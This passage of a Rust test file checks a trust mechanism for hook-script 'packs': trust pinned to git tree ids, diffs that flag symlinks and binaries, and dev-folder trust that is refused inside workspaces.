        .iter()
        .find(|file| file.path == "hooks/blob.bin")
        .unwrap();
    assert!(blob.lines.as_ref().unwrap().binary, "{blob:?}");

    // A pack with a symlink does not load, so the two trees are given to the diff directly.
    let before = fx.tree("main:.collide/packs/ferry");
    fx.repo.symlink(".collide/packs/ferry/hooks/link", "run.sh");
    fx.commit();
    let after = fx.tree("main:.collide/packs/ferry");
    let diffs = fx.trust.diff(
        &fx.repo.git_dir(),
        &[TrustInput::new("pack x", before)],
        &[TrustInput::new("pack x", after)],
    );
    let listed = files(find(&diffs, "pack x"));
    let link = listed
        .iter()
        .find(|file| file.path == "hooks/link")
        .unwrap();
    assert!(link.lines.is_none());
    assert!(
        link.note.as_deref().unwrap_or("").contains("symlink"),
        "{link:?}"
    );
}

#[test]
fn the_diff_is_deterministic() {
    let fx = Fx::basic();
    let line = fx.load();
    let hash = fx.hash_of(&line);
    fx.trust_line(&line, &hash).unwrap();
    fx.write(".collide/packs/ferry/hooks/run.sh", "#!/bin/sh\necho two\n");
    fx.write(".collide/config.yaml", "ask: { budget_usd: 0.9 }\n");
    fx.commit();
    let changed = fx.load();
    assert_eq!(fx.changes(&changed), fx.changes(&changed));
}

// ---- user packs ----

const USER_PACK: &str = "git:example.invalid/remote//pack@main";

/// A repository whose root is a pack, as a user pack's source would be, with the tree of each version.
fn user_pack_versions() -> (GitRepo, String, String) {
    let remote = GitRepo::new();
    remote.write(
        "pack.yaml",
        manifest("remote", "version: 1.0.0\n").as_bytes(),
    );
    remote.write("hooks/run.sh", b"#!/bin/sh\necho one\n");
    remote.commit_all("one");
    let one = remote.git(&["rev-parse", "HEAD^{tree}"]);
    remote.write("hooks/run.sh", b"#!/bin/sh\necho two\n");
    remote.commit_all("two");
    let two = remote.git(&["rev-parse", "HEAD^{tree}"]);
    (remote, one, two)
}

#[test]
fn a_user_pack_is_trusted_at_its_tree_id_and_untrusted_at_the_next() {
    let (remote, one, two) = user_pack_versions();
    let root = TempRoot::new();
    let trust = Trust::new(store_in(&root));
    assert_eq!(trust.pack_state(USER_PACK, &one), untrusted(&one));
    trust.trust_pack(USER_PACK, &one).unwrap();
    assert_eq!(trust.pack_state(USER_PACK, &one), trusted(&one));
    assert_eq!(trust.pack_state(USER_PACK, &two), untrusted(&two));
    assert_eq!(
        trust.pack_state("git:example.invalid/other", &one),
        untrusted(&one),
        "trust is per source"
    );

    let diffs = trust
        .pack_changes(&remote.git_dir(), USER_PACK, &two)
        .unwrap();
    assert_eq!(diffs.len(), 1);
    assert_eq!(diffs[0].change.name, format!("pack {USER_PACK}"));
    let listed = files(&diffs[0]);
    assert_eq!(listed[0].path, "hooks/run.sh");
    assert!(
        listed[0]
            .lines
            .as_ref()
            .unwrap()
            .lines
            .contains(&"+echo two".to_string())
    );

    trust.trust_pack(USER_PACK, &two).unwrap();
    assert_eq!(trust.pack_state(USER_PACK, &two), trusted(&two));
    assert_eq!(trust.pack_state(USER_PACK, &one), untrusted(&one));
    assert_eq!(mode(&root.join("config/collide/trust.yaml")), 0o600);
}

#[test]
fn a_user_pack_nobody_trusted_is_all_added_and_a_bad_tree_id_is_refused() {
    let (remote, one, _) = user_pack_versions();
    let root = TempRoot::new();
    let trust = Trust::new(store_in(&root));
    let diffs = trust
        .pack_changes(&remote.git_dir(), USER_PACK, &one)
        .unwrap();
    assert_eq!(diffs[0].change.kind, ChangeKind::Added);
    assert!(trust.trust_pack(USER_PACK, "main").is_err());
    assert!(!root.join("config/collide/trust.yaml").exists());
}

#[test]
fn a_user_pack_in_a_bad_store_is_untrusted() {
    let (_remote, one, _) = user_pack_versions();
    let (_root, store) = bad_store("packs: nope\n");
    let trust = Trust::new(store);
    assert_eq!(trust.pack_state(USER_PACK, &one), untrusted(&one));
    assert!(trust.trust_pack(USER_PACK, &one).is_err());
}

#[test]
fn the_review_text_of_a_loaded_pack_lists_what_it_runs() {
    let fx = Fx::new();
    fx.write(".collide/board.yaml", FERRY_BOARD);
    fx.write(
        ".collide/packs/ferry/pack.yaml",
        &manifest(
            "ferry",
            "version: 1.0.0\ngates:\n  tests: { script: hooks/tests.sh }\n\
             providers:\n  tasks: { script: p/tasks.ts }\n",
        ),
    );
    fx.write(".collide/packs/ferry/hooks/tests.sh", "#!/bin/sh\n");
    fx.write(".collide/packs/ferry/p/tasks.ts", "// provider\n");
    let commit = fx.commit();
    let line = fx.load();
    let ferry = line.packs.iter().find(|pack| pack.name == "ferry").unwrap();
    let text = pack_review(&ferry.manifest).render(ferry.source.as_deref().unwrap(), Some(&commit));
    for part in [
        "ferry 1.0.0",
        "repo:.collide/packs/ferry",
        &commit,
        "gates.tests",
        "providers.tasks",
    ] {
        assert!(text.contains(part), "{part} not in\n{text}");
    }
}

// ---- dev: folders ----

fn dev_folder(root: &TempRoot, name: &str) -> PathBuf {
    let folder = root.join(name);
    fs::create_dir_all(&folder).unwrap();
    fs::write(folder.join("pack.yaml"), manifest("devpack", "")).unwrap();
    folder
}

#[test]
fn a_dev_folder_is_trusted_per_folder_and_a_change_inside_it_does_not_ask_again() {
    let root = TempRoot::new();
    let trust = Trust::new(store_in(&root));
    let folder = dev_folder(&root, "dev-pack");
    let other = dev_folder(&root, "other-pack");
    assert!(!trust.dev_trusted(&folder, &[]).unwrap());
    trust.trust_dev(&folder, &[]).unwrap();
    assert!(trust.dev_trusted(&folder, &[]).unwrap());
    assert!(!trust.dev_trusted(&other, &[]).unwrap());

    fs::write(
        folder.join("pack.yaml"),
        manifest("devpack", "version: 9.9.9\n"),
    )
    .unwrap();
    fs::write(folder.join("hook.sh"), "echo new\n").unwrap();
    assert!(
        trust.dev_trusted(&folder, &[]).unwrap(),
        "a content change does not ask again"
    );

    let stored = trust.store().load().unwrap();
    let real = fs::canonicalize(&folder).unwrap();
    assert_eq!(stored.dev, vec![real.display().to_string()]);
}

#[test]
fn a_dev_folder_is_trusted_by_its_real_path() {
    let root = TempRoot::new();
    let trust = Trust::new(store_in(&root));
    let folder = dev_folder(&root, "dev-pack");
    let link = root.join("link-to-dev-pack");
    std::os::unix::fs::symlink(&folder, &link).unwrap();
    trust.trust_dev(&link, &[]).unwrap();
    assert!(trust.dev_trusted(&folder, &[]).unwrap());
}

#[test]
fn a_dev_folder_inside_a_workspace_is_refused_also_through_a_link() {
    let root = TempRoot::new();
    let trust = Trust::new(store_in(&root));
    let workspace = root.join("workspaces/run-1");
    fs::create_dir_all(&workspace).unwrap();
    let inside = dev_folder(&root, "workspaces/run-1/packs/mine");
    let outside = dev_folder(&root, "elsewhere");
    let link = root.join("link-into-workspace");
    std::os::unix::fs::symlink(&inside, &link).unwrap();
    let workspaces = vec![workspace.clone()];

    for folder in [&inside, &link, &workspace] {
        match trust.trust_dev(folder, &workspaces).unwrap_err() {
            TrustError::DevInWorkspace {
                workspace: named, ..
            } => {
                assert_eq!(named, workspace)
            }
            other => panic!("expected DevInWorkspace, got {other}"),
        }
        assert!(trust.dev_trusted(folder, &workspaces).is_err());
    }
    assert!(
        !root.join("config/collide/trust.yaml").exists(),
        "nothing was stored"
    );
    trust.trust_dev(&outside, &workspaces).unwrap();
    assert!(trust.dev_trusted(&outside, &workspaces).unwrap());
}

#[test]
fn a_dev_folder_that_is_not_there_or_is_a_file_is_refused() {
    let root = TempRoot::new();
    let trust = Trust::new(store_in(&root));
    let file = root.join("a-file");
    fs::write(&file, "x").unwrap();
    for folder in [root.join("missing"), file] {
        let error = trust.trust_dev(&folder, &[]).unwrap_err();
        assert!(matches!(error, TrustError::DevFolder { .. }), "{error}");
    }
}

// ---- no real home, no real git config ----

#[test]
fn the_reader_given_to_trust_is_the_one_that_runs_git() {
    // A `git` that fails shows that the hash goes through the injected reader, not through a fixed command.
    let fx = Fx::basic();
    let line = fx.load();
    let none = GitObjects::new().with_path(fx.repo.root().join("no-git-here"));
    let trust = Trust::new(TrustStore::new(&fx.store_dir)).with_git(none);
    let error = trust.line_hash(&fx.repo.git_dir(), &line).unwrap_err();
    assert!(matches!(error, TrustError::Git(_)), "{error}");
}
